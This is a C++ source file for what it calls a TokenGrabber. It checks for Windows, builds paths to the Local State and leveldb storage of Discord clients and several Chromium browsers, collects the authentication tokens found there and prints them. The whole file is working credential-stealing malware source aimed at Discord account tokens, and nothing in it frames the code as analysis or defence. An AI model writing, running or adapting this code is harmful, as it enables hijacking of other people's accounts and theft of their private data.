#include "TokenGrabber.hpp"

int main()
{
    // Check operating system
    if (!utils::console::is_windows()) {
        printf("The operating system has to be Windows NT\n");
        exit(EXIT_FAILURE);
    }

    // Here are the environmental variables
    std::string localappdata, appdata;
    utils::string::safe_getenv("LOCALAPPDATA", localappdata);
    utils::string::safe_getenv("APPDATA", appdata);

    // Define the paths from discord and from any chromium browsers 
    // First string is local state file's path and the second is leveldb folder's path
    std::vector<std::pair<std::string, std::string>> path_list;
    path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\discord\\Local State", appdata + "\\Discord\\Local Storage\\leveldb"));
    path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\discordcanary\\Local State", appdata + "\\discordcanary\\Local Storage\\leveldb"));
    path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\discordptb\\Local State", appdata + "\\discordptb\\Local Storage\\leveldb"));
    path_list.push_back(std::make_pair<std::string, std::string>(localappdata + "\\Google\\Chrome\\User Data\\Local State", localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"));
    path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\Opera Software\\Opera Stable\\Local State", appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb"));
    path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\Opera Software\\Opera GX Stable\\Local State", appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb"));
    path_list.push_back(std::make_pair<std::string, std::string>(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"));
    path_list.push_back(std::make_pair<std::string, std::string>(localappdata + "\\Yandex\\YandexBrowser\\User Data\\Local State", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"));
    
    // Define the Grabber
    TokenGrabber Grabber(path_list);

    // Initialize the Grabber
    Grabber.initialize();

    // Obtain the tokens from the specified paths
    std::vector<std::string> token_list = Grabber.collect_tokens();

    // Print the tokens
    for (const std::string &token : token_list) {

        if (token.empty()) { continue; }

        std::cout << "--------------------\n\n";
        std::cout << "Token: " << token << "\n";
        std::cout << "\n--------------------\n\n";
    }
}
